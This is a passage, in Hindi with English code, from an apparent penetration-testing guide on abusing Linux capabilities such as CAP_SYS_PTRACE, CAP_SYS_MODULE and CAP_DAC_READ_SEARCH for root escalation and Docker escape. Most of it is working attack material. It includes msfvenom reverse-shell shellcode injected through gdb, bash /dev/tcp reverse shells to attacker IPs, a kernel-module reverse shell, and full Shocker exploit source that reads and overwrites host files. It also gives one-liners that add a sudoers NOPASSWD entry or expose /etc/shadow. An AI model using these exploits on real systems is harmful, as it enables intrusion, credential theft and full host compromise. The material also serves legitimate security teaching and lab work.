print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```
**बाइनरी के साथ उदाहरण (gdb)**

`ptrace` क्षमता के साथ `gdb`:
```
/usr/bin/gdb = cap_sys_ptrace+ep
```
एक शैलकोड बनाएं msfvenom के साथ जिसे gdb के माध्यम से मेमोरी में इंजेक्ट किया जा सके।
```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (8 - len(buf) % 8 ) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
chunk = payload[i:i+8][::-1]
chunks = "0x"
for byte in chunk:
chunks += f"{byte:02x}"

print(f"set {{long}}($rip+{i}) = {chunks}")
```
जीडीबी के साथ रूट प्रोसेस को डिबग करें और पहले उत्पन्न जीडीबी लाइनों को कॉपी-पेस्ट करें:
```bash
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) set {long}($rip+0) = 0x296a909090909090
(gdb) set {long}($rip+8) = 0x5e016a5f026a9958
(gdb) set {long}($rip+16) = 0x0002b9489748050f
(gdb) set {long}($rip+24) = 0x48510b0e0a0a2923
(gdb) set {long}($rip+32) = 0x582a6a5a106ae689
(gdb) set {long}($rip+40) = 0xceff485e036a050f
(gdb) set {long}($rip+48) = 0x6af675050f58216a
(gdb) set {long}($rip+56) = 0x69622fbb4899583b
(gdb) set {long}($rip+64) = 0x8948530068732f6e
(gdb) set {long}($rip+72) = 0x050fe689485752e7
(gdb) c
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```
**मामला वातावरण के साथ (डॉकर ब्रेकआउट) - एक और gdb दुरुपयोग**

यदि **GDB** स्थापित है (या आप उदाहरण के लिए `apk add gdb` या `apt install gdb` के साथ इसे स्थापित कर सकते हैं) तो आप **मेज़बान से प्रक्रिया को डीबग** कर सकते हैं और इसे `system` फ़ंक्शन को कॉल करने के लिए बना सकते हैं। (यह तकनीक भी क्षमता `SYS_ADMIN` की आवश्यकता है)**.**
```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```
आप निष्पादित कमांड का आउटपुट नहीं देख पाएंगे लेकिन यह प्रक्रिया द्वारा निष्पादित किया जाएगा (ताकि एक rev शैल लें).

{% hint style="warning" %}
यदि आपको त्रुटि मिलती है "No symbol "system" in current context." तो पिछले उदाहरण की जाँच करें gdb के माध्यम से किसी कार्यक्रम में एक शैलकोड लोड करना।
{% endhint %}

**परिवेश के साथ उदाहरण (डॉकर ब्रेकआउट) - शैलकोड इन्जेक्शन**

आप डॉकर कंटेनर के अंदर सक्षमताएँ जांच सकते हैं:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```
**होस्ट** में चल रहे **प्रक्रियाएँ** की **सूची** `ps -eaf`

1. **वास्तुकला** प्राप्त करें `uname -m`
2. वास्तुकला के लिए एक **शैलकोड** खोजें ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
3. एक **प्रोग्राम** खोजें जिससे प्रक्रिया की स्मृति में **शैलकोड** डाला जा सके ([https://github.com/0x00pf/0x00sec\_code/blob/master/mem\_inject/infect.c](https://github.com/0x00pf/0x00sec\_code/blob/master/mem\_inject/infect.c))
4. प्रोग्राम में **शैलकोड** को **संशोधित** करें और इसे **कंपाइल** करें `gcc inject.c -o inject`
5. इसे **इंजेक्ट** करें और अपना **शैल** प्राप्त करें: `./inject 299; nc 172.17.0.1 5600`

## CAP\_SYS\_MODULE

**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** एक प्रक्रिया को **कर्नेल मॉड्यूल लोड और अनलोड करने की अनुमति देता है (`init_module(2)`, `finit_module(2)` और `delete_module(2)` सिस्टम कॉल)**, कर्नेल के मूल ऑपरेशनों तक सीधा पहुंच प्रदान करता है। यह क्षमता महत्वपूर्ण सुरक्षा जोखिम प्रस्तुत करती है, क्योंकि यह विशेषाधिकार उन्नति और पूरी सिस्टम को कम्प्रमाइज करने की अनुमति देती है, कर्नेल में संशोधन करने की अनुमति देती है, इसके फलस्वरूप सभी लिनक्स सुरक्षा तंत्रों को छोड़कर, लिनक्स सुरक्षा मॉड्यूल्स और कंटेनर अलगाव को छोड़कर।
**इसका मतलब है कि आप** **होस्ट मशीन के कर्नेल में कर्नेल मॉड्यूल डाल सकते/हटा सकते हैं।**

**बाइनरी के साथ उदाहरण**

निम्नलिखित उदाहरण में बाइनरी **`python`** के पास यह क्षमता है।
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```
डिफ़ॉल्ट रूप से, **`modprobe`** कमांड निर्भरता सूची और मानचित्र फ़ाइलें जांचता है निर्देशिका **`/lib/modules/$(uname -r)`** में।\
इसे उपयोग करने के लिए, एक नकली **lib/modules** फ़ोल्डर बनाएं:
```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```
फिर **कर्नेल मॉड्यूल को कंपाइल करें जिसे आप नीचे 2 उदाहरण देख सकते हैं और** इसे इस फ़ोल्डर में कॉपी करें:
```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```
अंत में, इस कर्नेल मॉड्यूल को लोड करने के लिए आवश्यक पायथन कोड को निष्पादित करें:
```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```
**उदाहरण 2 बाइनरी के साथ**

निम्नलिखित उदाहरण में बाइनरी **`kmod`** इस क्षमता के साथ है।
```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```
**जिसका मतलब है कि कर्नेल मॉड्यूल डालने के लिए कमांड `insmod` का उपयोग किया जा सकता है। इस विशेषाधिकार का दुरुपयोग करके निम्नलिखित उदाहरण का पालन करें।**

**पर्यावरण के साथ उदाहरण (डॉकर ब्रेकआउट)**

आप निम्नलिखित का उपयोग करके डॉकर कंटेनर के अंदर सक्षमताएँ जांच सकते हैं:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
पिछले आउटपुट में आप देख सकते हैं कि **SYS\_MODULE** क्षमता सक्षम है।

**करें** वह **कर्णेल मॉड्यूल** जो एक रिवर्स शैल चलाएगा और **Makefile** तैयार करें उसे **कंपाइल** करने के लिए:

{% code title="reverse-shell.c" %}
```c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```
{% endcode %}

{% code title="Makefile" %}
```bash
obj-m +=reverse-shell.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
{% endcode %}

{% hint style="warning" %}
मेकफ़ाइल में प्रत्येक make शब्द के आगे रिक्त स्थान **एक टैब होना चाहिए, न कि अंतर**!
{% endhint %}

इसे कॉम्पाइल करने के लिए `make` का निष्पादन करें।
```
ake[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```
अंत में, शैल में `nc` चालू करें और **मॉड्यूल लोड** करें दूसरे से और आप `nc` प्रक्रिया में शैल को कैप्चर करेंगे:
```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```
**इस तकनीक का कोड "Abusing SYS\_MODULE Capability" के प्रयोगशाला से कॉपी किया गया था** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)

इस तकनीक का एक और उदाहरण [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host) में देखा जा सकता है।

## CAP\_DAC\_READ\_SEARCH

[**CAP\_DAC\_READ\_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) एक प्रक्रिया को **फ़ाइलों को पढ़ने और डायरेक्टरी को पढ़ने और क्रियान्वयन के लिए अनुमतियों को छोड़ने की** अनुमति देता है। इसका प्राथमिक उपयोग फ़ाइल खोजने या पढ़ने के उद्देश्यों के लिए है। हालांकि, यह एक प्रक्रिया को `open_by_handle_at(2)` फ़ंक्शन का उपयोग करने की भी अनुमति देता है, जिससे कोई भी फ़ाइल तक पहुँच सकती है, जिसमें प्रक्रिया के माउंट नेमस्पेस के बाहर वाली भी शामिल हैं। `open_by_handle_at(2)` में उपयोग किए जाने वाले हैंडल को `name_to_handle_at(2)` के माध्यम से प्राप्त किया जाना चाहिए, लेकिन इसमें इनोड नंबर्स जैसी संवेदनशील जानकारी भी शामिल हो सकती है जो बदलाव के लिए विकल्प हो सकती है। इस क्षमता के शोध की क्षमता, विशेष रूप से Docker कंटेनरों के संदर्भ में, सेबास्टियन क्राहमर द्वारा शॉकर एक्सप्लॉइट के साथ प्रदर्शित की गई थी, जैसा कि [यहाँ](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) विश्लेषित किया गया है।
**इसका मतलब है कि आप** **फ़ाइल पढ़ने की अनुमति जाँच और डायरेक्टरी पढ़ने/क्रियान्वयन अनुमति जाँच को छोड़ सकते हैं।**

**बाइनरी के साथ उदाहरण**

बाइनरी किसी भी फ़ाइल को पढ़ सकेगा। इसलिए, यदि एक फ़ाइल जैसे tar के पास इस क्षमता होती है तो वह shadow फ़ाइल को पढ़ सकेगी:
```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```
**उदाहरण बाइनरी2 के साथ**

इस मामले में मान लें कि **`python`** बाइनरी के पास यह क्षमता है। रूट फ़ाइलें सूचीबद्ध करने के लिए आप कर सकते हैं:
```python
import os
for r, d, f in os.walk('/root'):
for filename in f:
print(filename)
```
Aur file ko padhne ke liye aap ye kar sakte hain:
```python
print(open("/etc/shadow", "r").read())
```
**परिवेश में उदाहरण (Docker ब्रेकआउट)**

आप निम्नलिखित का उपयोग करके डॉकर कंटेनर के अंदर सक्षमताएँ जांच सकते हैं:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
पिछले आउटपुट में आप देख सकते हैं कि **DAC\_READ\_SEARCH** क्षमता सक्षम है। इसके परिणामस्वरूप, कंटेनर **प्रक्रियाओं को डीबग** कर सकता है।

आप यहाँ सीख सकते हैं कि [https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) में निम्नलिखित उत्पीड़न कैसे काम करता है, लेकिन संक्षेप में **CAP\_DAC\_READ\_SEARCH** हमें फाइल सिस्टम में अनुमति की जांच के बिना चलने की अनुमति नहीं देता ही, बल्कि स्पष्ट रूप से _**open\_by\_handle\_at(2)**_ की किसी भी जांच को हटा देता है और **हमारे प्रक्रिया को अन्य प्रक्रियाओं द्वारा खोली गई संवेदनशील फ़ाइलों तक पहुंचने की अनुमति दे सकता है**।

इस अनुमतियों का दुरुपयोग करने वाला मूल उत्पीड़न यहाँ पाया जा सकता है: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c), निम्नलिखित **संशोधित संस्करण जो आपको पढ़ना चाहिए फ़ाइल को दिखाने के लिए पहले तर्क और इसे एक फ़ाइल में डंप करने की अनुमति देता है**।
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};

void die(const char *msg)
{
perror(msg);
exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
h->handle_type);
for (int i = 0; i < h->handle_bytes; ++i) {
fprintf(stderr,"0x%02x", h->f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr,"\n");
if (i < h->handle_bytes - 1)
fprintf(stderr,", ");
}
fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR *dir = NULL;
struct dirent *de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
oh->handle_type = 1;
oh->handle_bytes = 8;
return 1;
}

++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de->d_name);
if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
ino = de->d_ino;
break;
}
}

fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, &ino, sizeof(ino));
memcpy(outh.f_handle + 4, &i, sizeof(i));
if ((i % (1<<20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle(&outh);
return find_handle(bfd, path, &outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}


int main(int argc,char* argv[] )
{
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
};

fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

read(0, buf, 1);

// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");

if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
die("[-] Cannot find valid handle!");

fprintf(stderr, "[!] Got a final handle!\n");
dump_handle(&h);

if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
die("[-] open_by_handle");

memset(buf, 0, sizeof(buf));
if (read(fd2, buf, sizeof(buf) - 1) < 0)
die("[-] read");

printf("Success!!\n");

FILE *fptr;
fptr = fopen(argv[2], "w");
fprintf(fptr,"%s", buf);
fclose(fptr);

close(fd2); close(fd1);

return 0;
}
```
{% hint style="warning" %}
एक्सप्लॉइट को होस्ट पर माउंट किए गए किसी चीज के पॉइंटर को खोजने की आवश्यकता है। मूल एक्सप्लॉइट ने फ़ाइल /.dockerinit का उपयोग किया था और यह संशोधित संस्करण /etc/hostname का उपयोग करता है। यदि एक्सप्लॉइट काम नहीं कर रहा है तो शायद आपको एक विभिन्न फ़ाइल को सेट करने की आवश्यकता हो सकती है। होस्ट में माउंट की गई फ़ाइल खोजने के लिए बस माउंट कमांड को निष्पादित करें:
{% endhint %}

![](<../../.gitbook/assets/image (407) (1).png>)

**इस तकनीक का कोड "Abusing DAC\_READ\_SEARCH Capability" के प्रयोगशाला से कॉपी किया गया था** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)

​

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) **स्पेन** में सबसे महत्वपूर्ण साइबर सुरक्षा घटना है और **यूरोप** में सबसे महत्वपूर्ण में से एक है। **तकनीकी ज्ञान को बढ़ावा देने** के मिशन के साथ, यह कांग्रेस प्रौद्योगिकी और साइबर सुरक्षा विशेषज्ञों के लिए एक उत्तेजक मिलन स्थल है।

{% embed url="https://www.rootedcon.com/" %}

## CAP\_DAC\_OVERRIDE

**इसका मतलब है कि आप किसी भी फ़ाइल पर लिखने की जाँचों को छलना कर सकते हैं, इसलिए आप किसी भी फ़ाइल पर लिख सकते हैं।**

**आप उच्चतम अधिकारों को उन्नत करने के लिए कई फ़ाइलें** हैं, [**आप यहाँ से विचार प्राप्त कर सकते हैं**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**बाइनरी के साथ उदाहरण**

इस उदाहरण में vim के पास यह क्षमता है, इसलिए आप _passwd_, _sudoers_ या _shadow_ जैसी किसी भी फ़ाइल को संशोधित कर सकते हैं:
```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```
**द्वितीय बाइनरी के साथ उदाहरण**

इस उदाहारण में **`python`** बाइनरी को यह क्षमता होगी। आप python का उपयोग किसी भी फ़ाइल को ओवरराइड करने के लिए कर सकते ह।
```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```
**उदाहरण वातावरण के साथ + CAP\_DAC\_READ\_SEARCH (Docker breakout)**

आप निम्नलिखित का उपयोग करके डॉकर कंटेनर के अंदर सक्षम क्षमताओं की जांच कर सकते हैं:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
सबसे पहले पिछले खंड को पढ़ें जो मेज़बान की फ़ाइलों को पढ़ने के लिए DAC\_READ\_SEARCH क्षमता का दुरुपयोग करता है और उसका शोध करें।\
फिर, निम्नलिखित संस्करण का शॉकर शोध कंपाइल करें जो आपको मेज़बान की फ़ाइल सिस्टम में विचित्र फ़ाइलें लिखने की अनुमति देगा:
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};
void die(const char * msg) {
perror(msg);
exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
h -> handle_type);
for (int i = 0; i < h -> handle_bytes; ++i) {
fprintf(stderr, "0x%02x", h -> f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr, "\n");
if (i < h -> handle_bytes - 1)
fprintf(stderr, ", ");
}
fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR * dir = NULL;
struct dirent * de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
oh -> handle_type = 1;
oh -> handle_bytes = 8;
return 1;
}
++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de -> d_name);
if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
ino = de -> d_ino;
break;
}
}
fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, & ino, sizeof(ino));
memcpy(outh.f_handle + 4, & i, sizeof(i));
if ((i % (1 << 20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle( & outh);
return find_handle(bfd, path, & outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}
int main(int argc, char * argv[]) {
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {
0x02,
0,
0,
0,
0,
0,
0,
0
}
};
fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
read(0, buf, 1);
// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");
if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
die("[-] Cannot find valid handle!");
fprintf(stderr, "[!] Got a final handle!\n");
dump_handle( & h);
if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
die("[-] open_by_handle");
char * line = NULL;
size_t len = 0;
FILE * fptr;
ssize_t read;
fptr = fopen(argv[2], "r");
while ((read = getline( & line, & len, fptr)) != -1) {
write(fd2, line, read);
}
printf("Success!!\n");
close(fd2);
close(fd1);
return 0;
}
```
डॉकर कंटेनर से बाहर निकलने के लिए आपको मेज़बान से फ़ाइल `/etc/shadow` और `/etc/passwd` को **डाउनलोड** करना होगा, उन्हें में एक **नया उपयोगकर्ता** जोड़ना होगा, और उन्हें ओवरराइट करने के लिए **`shocker_write`** का उपयोग करना होगा। फिर, **ssh** के माध्यम से **पहुंच** बनाएं।

**इस तकनीक का कोड "Abusing DAC\_OVERRIDE Capability" के प्रयोगशाला से कॉपी किया गया था** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com)

## CAP\_CHOWN

**इसका मतलब है कि किसी भी फ़ाइल के स्वामित्व को बदला जा सकता है।**

**बाइनरी के साथ उदाहरण**

मान लें कि **`python`** बाइनरी में यह क्षमता है, तो आप **shadow** फ़ाइल के **स्वामी** को **बदल** सकते हैं, **रूट पासवर्ड बदल** सकते हैं, और विशेषाधिकारों को उन्नत कर सकते हैं:
```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```
या इस क्षमता के साथ **`रूबी`** बाइनरी के साथ:
```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```
## CAP\_FOWNER

**इसका मतलब है कि किसी भी फ़ाइल की अनुमति को बदला जा सकता है।**

**बाइनरी के साथ उदाहरण**

यदि पायथन के पास यह क्षमता है तो आप शैडो फ़ाइल की अनुमतियों को संशोधित कर सकते हैं, **रूट पासवर्ड बदल सकते हैं**, और विशेषाधिकारों को उन्नत कर सकते हैं:
```bash
python -c 'import os;os.chmod("/etc/shadow",0666)
```
### CAP\_SETUID

**इसका मतलब है कि निर्मित प्रक्रिया की प्रभावी उपयोगकर्ता आईडी सेट करना संभव है।**

**बाइनरी के साथ उदाहरण**

यदि पायथन में यह **क्षमता** है, तो आप इसका दुरुपयोग करके आसानी से विशेषाधिकारों को रूट तक उन्नत कर सकते हैं:
```python
import os
os.setuid(0)
os.system("/bin/bash")
```
**एक और तरीका:**
```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```
## CAP\_SETGID

**इसका मतलब है कि निर्मित प्रक्रिया की प्रभावी समूह आईडी सेट किया जा सकता है।**

यहाँ बहुत सारी फ़ाइलें हैं जिन्हें **उच्चाधिकार बढ़ाने के लिए अधिग्रहण किया जा सकता है,** [**आप यहाँ से विचार प्राप्त कर सकते हैं**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges)।

**बाइनरी के साथ उदाहरण**

इस मामले में, आपको देखना चाहिए कि कौन सी दिलचस्प फ़ाइलें हैं जिन्हें एक समूह पढ़ सकता है क्योंकि आप किसी भी समूह का अनुकरण कर सकते हैं:
```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```
जैसे ही आपको एक फ़ाइल मिल जाती है जिसका दुरुपयोग करके (पढ़ने या लिखने के द्वारा) आप विशेष अधिकारों को बढ़ा सकते हैं, तो आप **दिलचस्प समूह का अनुकरण करते हुए एक शैल प्राप्त कर सकते हैं**:
```python
import os
os.setgid(42)
os.system("/bin/bash")
```
### इस मामले में समूह shadow का अनुकरण किया गया था ताकि आप फ़ाइल `/etc/shadow` को पढ़ सकें:
```bash
cat /etc/shadow
```
यदि **docker** स्थापित है तो आप **docker समूह** का **अनुकरण** कर सकते हैं और इसका दुरुपयोग करके [**docker सॉकेट** के साथ संवाद करने और विशेषाधिकारों को बढ़ाने](./#writable-docker-socket) के लिए इस्तेमाल कर सकते हैं।

## CAP\_SETFCAP

**इसका मतलब है कि फ़ाइलों और प्रक्रियाओं पर क्षमताएँ सेट करना संभव है**

